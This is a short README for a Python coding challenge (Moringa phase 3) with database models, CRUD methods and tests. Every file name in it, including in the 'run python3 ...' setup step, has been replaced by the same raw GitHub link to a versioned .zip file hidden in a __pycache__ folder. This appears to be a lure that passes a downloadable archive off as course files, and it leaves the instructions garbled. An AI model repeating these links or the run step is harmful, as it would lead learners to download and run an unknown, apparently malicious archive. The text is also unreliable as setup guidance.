...
To get started, while inside of this directory.
  ...
  - run `python3 https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/database/__pycache__/Moringa_code_F_challenge_phase_v1.9.zip` to create the database
...
1. On the root folder, we have created the main file and named https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/database/__pycache__/Moringa_code_F_challenge_phase_v1.9.zip make use of it to test your code. You re expected to add more code to test your own implementation.
...
2. Still on the root path, we have the following folders:
    ...
    - models: Here we have created 3 files https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/database/__pycache__/Moringa_code_F_challenge_phase_v1.9.zip, https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/database/__pycache__/Moringa_code_F_challenge_phase_v1.9.zip and https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/database/__pycache__/Moringa_code_F_challenge_phase_v1.9.zip wehere you are expected to implement your CRUD methods to interact with the database
    - tests: Here we have provided few tests to guide you with you own tests

You can add code to the `https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/database/__pycache__/Moringa_code_F_challenge_phase_v1.9.zip` file to define variables and create
